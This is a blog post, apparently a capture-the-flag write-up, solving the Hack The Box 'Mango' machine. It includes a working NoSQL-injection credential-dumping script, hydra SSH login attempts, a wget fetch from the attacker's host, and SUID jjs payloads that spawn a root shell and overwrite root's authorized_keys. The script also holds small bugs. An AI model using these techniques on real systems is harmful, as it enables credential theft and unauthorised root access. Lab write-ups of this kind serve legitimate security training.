@@ -1,0 +1,407 @@
+---
+layout: post
+title:  "Hack The Box - Mango"
+date:   2020-04-19 02:48:00 +0800
+categories: hackthebox mongodb jjs ssh linux
+---
+
+![](/assets/images/mango.png){:height="414px" width="615px"}
+
+# Configuration
+
+The operating systems that I will be using to tackle this machine is a Kali Linux VM.
+
+What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
+
+{% highlight bash %}
+$ echo "10.10.10.162 mango.htb" >> /etc/hosts
+{% endhighlight %}
+
+# Reconnaissance
+
+Using `nmap`, we are able to determine the open ports and running services on the machine.
+{% highlight bash %}
+$ nmap -sV -sT -sC mango.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 13:05 EST
+Nmap scan report for mango.htb (10.10.10.162)
+Host is up (0.26s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
+|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
+|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
+80/tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 403 Forbidden
+443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
+| Not valid before: 2019-09-27T14:21:19
+|_Not valid after:  2020-09-26T14:21:19
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 54.48 seconds
+
+{% endhighlight %}
+
+# Enumeration (1)
+
+Not much can be done with the `ssh` service as we do not have any credentials on hand so lets come back to it later. As for the `http` service, maybe we can find some information on it ?
+
+![](/assets/images/mango1.png)
+
+`Forbidden`... Bruteforcing the directory and pages also returned no results :( Lets see if the `https` service has something for us?
+
+![](/assets/images/mango2.png)
+
+Looks like a copycat of Google's search engine! But unfortunately it does nothing at all. However, clicking on the "Analytics" button brought us to another page.
+
+![](/assets/images/mango3.png)
+
+The content seems to be from some external websites, which happen to be out of our scope so we can ignore this :) 
+
+If we check our `nmap` results again and look closely at the `ssl-cert` information under port 443, we realise that there is a subdomain under `mango.htb`: `staging-order.mango.htb`. Viewing the certificate via the browser also shows the same domain name.
+
+![](/assets/images/mango4.png)
+
+Lets add `staging-order.mango.htb` to our `/etc/hosts` and see if that changes anything.
+
+{% highlight bash %}
+$ cat /etc/hosts
+...
+10.10.10.162 mango.htb staging-order.mango.htb
+{% endhighlight %}
+
+![](/assets/images/mango5.png)
+
+Entering `https://staging-order.mango.htb` into the browser shows a login screen! 
+
+At this time I was kinda stuck because I had no credentials to test with and I even tried using `SQL injection`, but to no avail :( I decided to consult the forums and got a hint that to think about what database the web app was using and how it relates to the name of this box aka `Mango`. So I enterd "mango db" into Google and saw this:
+
+![](/assets/images/mango6.png)
+
+I went on to search for `MongoDB injection` and found [this](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection). I then tried to login with some credentials and used `Burp Suite` to intercept the request. I then modified the request body parameters:
+
+![](/assets/images/mango7.png)
+
+And got redirected to `/home.php`!
+
+![](/assets/images/mango8.png)
+
+Seems like the web app is vulnerable to `NoSQL` injections! I then made a script to help me automate the dumping out of the credentials in the database:
+
+{% highlight python %}
+import requests
+import string
+from urllib import quote_plus
+import re
+
+VALID_CHARS = string.printable
+URL = "http://staging-order.mango.htb/"
+HEADERS = {'Content-Type': 'application/x-www-form-urlencoded'}
+MAX_FIELD_LENGTH = 255
+
+
+def check_valid(payload):
+	"""This function returns True if the request results in a successful login"""
+	return requests.post(URL, data=payload,headers=HEADERS, allow_redirects=False).headers.get('location', '') == 'home.php'
+
+
+def enumerate_usernames():
+	"""This function returns a list of usernames extracted"""
+	list_of_usernames = []
+
+	valid_username_lengths = get_username_lengths()
+
+	for user_len in valid_username_lengths:
+		list_of_usernames += get_usernames(user_len)
+
+	return list_of_usernames
+
+
+def get_username_lengths():
+	"""This function returns a list containing the various lengths of the usernames"""
+	test_username_length_format = "username[$regex]=^.{% raw %}{{{}}}{% endraw %}$&password[$ne]=something&login=login"
+	valid_username_lengths = []
+	for i in xrange(1, FIELD_LENGTH + 1):
+		payload = test_username_length_format.format(i)
+		print("[*] Testing for username length: {}".format(i))
+		if check_valid(payload):
+			# print("[*] Username length found: {}".format(i))
+			valid_username_lengths.append(i)
+	return valid_username_lengths
+
+
+def get_usernames(length):
+	"""This function returns a list of usernames of the given length"""
+	usernames = set()
+	test_username_format = "username[$regex]=^{}.*$&password[$ne]=something&login=login"
+
+	while True:
+		username = ""
+		for idx in range(length):
+			for i in VALID_CHARS:
+				tmp = username + i
+				print "[*] Testing for username: {}".format(tmp)
+				payload = test_username_format.format(tmp)
+				if check_valid(payload):
+					username = tmp
+					break
+
+		if username and username not in usernames:
+			test_username_format += "&username[$ne]={}".format(username)
+			usernames.add(username)
+			print("[*] Username found: {}".format(username))
+		else:
+			break
+
+	return list(usernames)
+
+
+def get_password_length(username):
+	"""This function returns the length of the password corresponding to the given username"""
+	test_password_length_format = "username={}&password[$regex]=^.{% raw %}{{{}}}{% endraw %}$&login=login"
+
+	for i in xrange(1, FIELD_LENGTH + 1):
+		print("[*] Testing for password length: {}".format(i))
+		payload = test_password_length_format.format(username, i)
+		if check_valid(payload):
+			return i
+
+def get_password(username):
+	"""This function returns the password corresponding to the given username"""
+	test_password_format = "username={}&password[$regex]=^{}.*$&login=login"
+
+	password = ""
+
+	for idx in range(get_password_length(username)):
+		for i in VALID_CHARS:
+			tmp = password + i
+			print("[*] Testing for password: {}".format(tmp))
+			payload = test_password_format.format(username, quote_plus(re.escape(tmp)))
+			if check_valid(payload):
+				password = tmp
+				print("[*] Password found: {}".format(password))
+				break
+
+	return password
+
+
+
+def main():
+	"""This is the main function"""
+	user_list = enumerate_usernames()
+	for username in user_list:
+		password = get_password(username)
+		print("[*] Found {}:{}".format(username, password))
+
+
+if __name__ == "__main__":
+	main()
+
+{% endhighlight %}
+
+It takes a while to run (perhaps optimize using binary search?), but we managed to dump out 2 sets of credentials:
+
+{% highlight bash %}
+[*] Found admin:t9KcS3>!0B#2
+[*] Found mango:h3mXK8RhU~f{]f5H
+{% endhighlight %}
+
+The web app doesn't seem to have any other functionality that we can exploit so lets see if we can try using these credentials on the `ssh` service!
+
+{% highlight bash %}
+$ cat user.txt
+admin
+mango
+
+$ cat pass.txt
+t9KcS3>!0B#2
+h3mXK8RhU~f{]f5H
+
+$ hydra -L user.txt -P pass.txt ssh://mango.htb
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-18 15:17:36
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:2/p:2), ~1 try per task
+[DATA] attacking ssh://mango.htb:22/
+[22][ssh] host: mango.htb   login: mango   password: h3mXK8RhU~f{]f5H
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-18 15:17:41
+{% endhighlight %}
+
+Using this set of credentials, we can `ssh` into the box:
+
+{% highlight bash %}
+$ ssh mango@mango.htb
+mango@mango.htb's password:
+mango@mango:~$ ls -al 
+total 44
+drwxr-xr-x 6 mango mango 4096 Apr 18 19:04 .
+drwxr-xr-x 4 root  root  4096 Sep 27  2019 ..
+lrwxrwxrwx 1 mango mango    9 Sep 27  2019 .bash_history -> /dev/null
+-rw-r--r-- 1 mango mango  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 mango mango 3771 Apr  4  2018 .bashrc
+drwx------ 2 mango mango 4096 Sep 28  2019 .cache
+-rw------- 1 mango mango   14 Apr 18 16:34 .dbshell
+drwx------ 3 mango mango 4096 Apr 18 18:23 .gnupg
+drwxrwxr-x 3 mango mango 4096 Apr 18 16:29 .local
+-rw------- 1 mango mango    0 Apr 18 16:34 .mongorc.js
+-rw-r--r-- 1 mango mango  807 Apr  4  2018 .profile
+drwx------ 2 mango mango 4096 Apr 18 18:31 .ssh
+-rw------- 1 mango mango  858 Apr 18 19:04 .viminfo
+{% endhighlight %}
+
+Where's the `user.txt`? Lets see if there are any other possible users on the box.
+
+{% highlight bash %}
+mango@mango:~$ ls -al /home
+total 16
+drwxr-xr-x  4 root  root  4096 Sep 27  2019 .
+drwxr-xr-x 23 root  root  4096 Sep 27  2019 ..
+drwxr-xr-x  4 admin admin 4096 Apr 18 19:26 admin
+drwxr-xr-x  6 mango mango 4096 Apr 18 19:04 mango
+{% endhighlight %}
+
+Seems like `admin` has the `user.txt`!
+
+# user.txt
+
+Using `su` and the admin credentials we found in the web app database, we are able to login as `admin`.
+
+{% highlight bash %}
+mango@mango:~$ su admin
+Password: 
+$ whoami
+admin
+{% endhighlight %}
+
+Getting the flag was a piece of cake:
+{% highlight bash %}
+$ cat ~/user.txt
+79bfXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+{% endhighlight %}
+
+# Enumeration(2)
+
+As usual, I will use [`LinEnum`](https://github.com/rebootuser/LinEnum) to enumerate for ways to escalate to `root`.
+
+Spawning web server:
+{% highlight bash %}
+$ mkdir httpserver
+$ cd httpserver
+$ cp ~/LinEnum.sh .
+$ python3 -m http.server 80 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+{% endhighlight %}
+
+Retrieving the script:
+{% highlight bash %}
+$ cd /tmp
+$ wget http://10.10.XX.XX/LinEnum.sh
+--2020-04-18 20:04:09--  http://10.10.XX.XX/LinEnum.sh
+Connecting to 10.10.14.217:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46476 (45K) [text/x-sh]
+Saving to: ‘LinEnum.sh’
+
+LinEnum.sh                                     100%[====================================================================================================>]  45.39K  78.8KB/s    in 0.6s    
+
+2020-04-18 20:04:10 (78.8 KB/s) - ‘LinEnum.sh’ saved [46476/46476]
+{% endhighlight %}
+
+Running the script:
+{% highlight bash %}
+$ chmod +x LinEnum.sh
+$ ./LinEnum.sh
+...
+[+] Possibly interesting SUID files:
+-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+{% endhighlight %}
+
+Alright, we can use this executable to escalate our privileges! With the `SUID` bit set on the file, we can execute `jjs` as if we are `root`.
+
+According to [`GTFOBins`](https://gtfobins.github.io/gtfobins/jjs/), we are able to spawn an interactive shell with elevated permissions:
+
+{% highlight bash %}
+$ cd /usr/lib/jvm/java-11-openjdk-amd64/bin/
+$ echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | ./jjs
+Warning: The jjs tool is planned to be removed from a future JDK release
+jjs> Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/pts/0 >/dev/pts/0 2>/dev/pts/0').waitFor()
+# 
+{% endhighlight %}
+
+Unfortunately, it did spawn but it just hung there :( So we gotta think of an alternative way to get root shell.
+
+I tried to spawn a reverse shell back to my listener but it didn't work. However, I realised that I was able to perform very simple commands like "cp" and "mv" but no piping or redirection.
+
+So how about we write to `root`'s `authorized_keys` file?
+{% highlight bash %}
+# cat /etc/ssh/sshd_config
+...
+PermitRootLogin yes
+...
+AllowUsers mango root
+{% endhighlight %}
+
+# root.txt
+
+From the above config, we can confirm that we are able to `ssh` directly into the box as `root`. To do so, first we'll need to generate a `SSH` keypair.
+
+{% highlight bash %}
+ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/.ssh/id_rsa.
+Your public key has been saved in /root/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:TEPWxxvFEd9AoEM+xQGEYHHyVHuUeSugqKuFihcLCf4 root@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|      =o===+=O*o |
+|     . B.oo=B oo.|
+|       .+.*o.+ .o|
+|.     .o.. +o .  |
+|o.   .  S    .   |
+|o....            |
+| .oo..           |
+|..oE.            |
+|o...             |
++----[SHA256]-----+
+{% endhighlight %}
+
+Open the public key`/root/.ssh/id_rsa.pub` and copy the contents into your clipboard.
+
+Echo it into a file in the `tmp` directory.
+
+{% highlight bash %}
+# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXGz/VwVW7AUU35k3HgAjJ7aYLCgE9miz7g4XvCsB+Bk/0NpQWIcd4PUXe4JSe0CK5Dgj2F5LVnKd6s87HN0v0s8RUcsDEKsnwYhIrHmL8G2nYgEl0Pixj7u67lHJbs1pCFfMP4Aj0pJzUoCHhroqXpkdj6P8/FHUnBKntyo51BXzqemUNrif3joCNF/AbQUTPBFMAHmciN2huxU8Q1E8vmVR3SXZbmKw4ZX8wj8sf49hJDCNm2qpiVNyB4nS8KaShMP69ya0mH9ynF2P0YF4nJJlbHcO/j9jvbK5NNMYQSl/xmyL+9okjExiXFH0yQulpDKWsnZv6s8N9K3ASwWIsyavxc7B1UnqOp2elLuRgLI/3QL5XXEEU+l7s/MJ5l9LTvSWBS4m2e1Xqlye41AJAE38p8qq0wX9q3AefEHlOnOcn5XiQQ9H37cx6dayf9B+gKim1G/KycAiURD8Q/+cNs9KCuS9p8gTdReA9ZMSLQ5dXV+tHd06ENAAPYY/HH58= root@kali" > /tmp/secret
+{% endhighlight %}
+
+And now overwrite the `root`'s `authorized_keys` file!
+
+{% highlight bash %}
+$ echo "Java.type('java.lang.Runtime').getRuntime().exec('cp /tmp/secret /root/.ssh/authorized_keys').waitFor()" | ./jjs
+{% endhighlight %}
+
+Now, we are able to `ssh` into the `root` account using our private key `/root/id_rsa`:
+
+{% highlight bash %}
+$ ssh -i /root/id_rsa root@mango.htb
+...
+root@mango:~# cat root.txt
+8a8eXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+{% endhighlight %}
+
+
+Rooted ! Thank you for reading and look forward for more writeups and articles !
